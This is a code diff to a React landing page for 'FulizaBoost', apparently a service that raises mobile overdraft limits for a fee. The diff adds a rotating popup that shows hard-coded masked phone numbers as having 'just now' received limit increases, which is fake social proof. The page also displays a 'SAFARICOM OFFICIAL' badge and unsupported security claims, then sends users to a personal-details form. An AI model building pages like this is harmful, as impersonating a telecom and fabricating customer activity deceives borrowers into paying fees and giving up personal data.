@@ -1,4 +1,4 @@
-import { useState } from "react";
+import { useState, useEffect } from "react";
 import "../styles/Home.css";
 import { useNavigate } from "react-router-dom";
 
@@ -19,16 +19,53 @@ const limits: LimitOption[] = [
   { amount: 45000, fee: 5000 },
 ];
 
+const notifications = [
+  { phone: "0708****85", limit: 45000 },
+  { phone: "0712****34", limit: 30000 },
+  { phone: "0722****91", limit: 25000 },
+  { phone: "0733****56", limit: 35000 },
+  { phone: "0745****23", limit: 20000 },
+  { phone: "0756****78", limit: 15000 },
+  { phone: "0767****12", limit: 40000 },
+  { phone: "0778****45", limit: 25000 },
+  { phone: "0789****67", limit: 30000 },
+  { phone: "0791****89", limit: 45000 },
+];
+
 const Home = () => {
   const [selectedAmount, setSelectedAmount] = useState<number | null>(null);
+  const [currentNotification, setCurrentNotification] = useState(notifications[0]);
+  const [showNotification, setShowNotification] = useState(true);
   const navigate = useNavigate();
   
+  // Change notification every 4 seconds
+  useEffect(() => {
+    const interval = setInterval(() => {
+      setShowNotification(false);
+      
+      setTimeout(() => {
+        const randomIndex = Math.floor(Math.random() * notifications.length);
+        setCurrentNotification(notifications[randomIndex]);
+        setShowNotification(true);
+      }, 300);
+    }, 4000);
 
+    return () => clearInterval(interval);
+  }, []);
 
   return (
     <main className="container">
       {/* HEADER */}
       <div className="badge">● SAFARICOM OFFICIAL</div>
+
+      {/* NOTIFICATION OVERLAY */}
+      <div className={`notification-overlay ${showNotification ? 'show' : ''}`}>
+        <div className="notification-icon">✅</div>
+        <div className="notification-content">
+          <strong>{currentNotification.phone}</strong> increased to Ksh {currentNotification.limit.toLocaleString()}
+          <div className="notification-time">• just now</div>
+        </div>
+      </div>
 
       <h1 className="title">FulizaBoost</h1>
       <p className="subtitle">
@@ -67,21 +104,20 @@ const Home = () => {
       <div className="secure">
         🔒 VERIFIED SECURE • END-TO-END ENCRYPTED
       </div>
-<button
-  className={`continue-btn ${selectedAmount ? "enabled" : ""}`}
-  disabled={!selectedAmount}
-  onClick={() => {
-    const selectedLimit = limits.find(l => l.amount === selectedAmount);
-    if (selectedLimit) {
-      navigate("/personal-details", { state: selectedLimit });
-      sessionStorage.setItem("selectedLimit", JSON.stringify(selectedLimit));
-    }
-  }}
->
-  Continue
-</button>
-
-
+      
+      <button
+        className={`continue-btn ${selectedAmount ? "enabled" : ""}`}
+        disabled={!selectedAmount}
+        onClick={() => {
+          const selectedLimit = limits.find(l => l.amount === selectedAmount);
+          if (selectedLimit) {
+            navigate("/personal-details", { state: selectedLimit });
+            sessionStorage.setItem("selectedLimit", JSON.stringify(selectedLimit));
+          }
+        }}
+      >
+        Continue
+      </button>
     </main>
   );
 };
